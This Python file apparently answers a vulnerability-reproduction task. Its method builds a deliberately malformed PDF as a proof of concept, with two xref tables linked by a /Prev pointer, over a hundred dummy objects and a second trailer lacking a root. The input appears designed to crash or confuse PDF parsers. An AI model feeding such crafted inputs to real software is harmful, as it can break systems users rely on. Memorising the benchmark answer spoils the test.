import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc_parts = []

        poc_parts.append(b"%PDF-1.7\n")
        poc_parts.append(b"%\xde\xad\xbe\xef\n")

        obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        obj2 = b"2 0 obj\n<< /Type /Pages /Count 1 /Kids [3 0 R] >>\nendobj\n"
        obj3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /Contents 4 0 R >>\nendobj\n"
        
        body1_list = [obj1, obj2, obj3]
        
        offsets = {}
        current_offset = len(b"".join(poc_parts))
        for i, obj_bytes in enumerate(body1_list, 1):
            offsets[i] = current_offset
            current_offset += len(obj_bytes)
        
        body1 = b"".join(body1_list)
        poc_parts.append(body1)

        xref1_offset = len(b"".join(poc_parts))
        
        xref1_str = "xref\n"
        xref1_str += "0 4\n"
        xref1_str += "0000000000 65535 f \n"
        xref1_str += f"{offsets[1]:010} 00000 n \n"
        xref1_str += f"{offsets[2]:010} 00000 n \n"
        xref1_str += f"{offsets[3]:010} 00000 n \n"
        xref1 = xref1_str.encode('ascii')

        trailer1_str = "trailer\n<< /Size 4 /Root 1 0 R /Prev XREF2_OFFSET_PLACEHOLDER >>\n"
        trailer1 = trailer1_str.encode('ascii')

        body2_list = []
        
        obj4 = b"4 0 obj\n<</DummyData true>>\nendobj\n"
        body2_list.append(obj4)
        
        num_dummy_objs = 118
        for i in range(num_dummy_objs):
            obj_num = 5 + i
            dummy_obj = f"{obj_num} 0 obj\n<</Dummy {i}>>\nendobj\n".encode('ascii')
            body2_list.append(dummy_obj)
            
        final_obj_num = 4 + num_dummy_objs
        
        current_offset = len(b"".join(poc_parts)) + len(xref1) + len(trailer1)
        for i, obj_bytes in enumerate(body2_list, 4):
            offsets[i] = current_offset
            current_offset += len(obj_bytes)

        body2 = b"".join(body2_list)

        xref2_offset = len(b"".join(poc_parts)) + len(xref1) + len(trailer1) + len(body2)
        
        trailer1 = trailer1.replace(b"XREF2_OFFSET_PLACEHOLDER", str(xref2_offset).encode('ascii'))
        
        poc_parts.append(xref1)
        poc_parts.append(trailer1)
        poc_parts.append(body2)
        
        xref2_str = "xref\n"
        xref2_str += f"4 {final_obj_num - 4 + 1}\n"
        for i in range(4, final_obj_num + 1):
             xref2_str += f"{offsets[i]:010} 00000 n \n"
        xref2 = xref2_str.encode('ascii')
        
        trailer2_str = f"trailer\n<< /Size {final_obj_num + 1} >>\n"
        trailer2 = trailer2_str.encode('ascii')
        
        poc_parts.append(xref2)
        poc_parts.append(trailer2)
        
        startxref_str = f"startxref\n{xref1_offset}\n%%EOF\n"
        poc_parts.append(startxref_str.encode('ascii'))

        return b"".join(poc_parts)
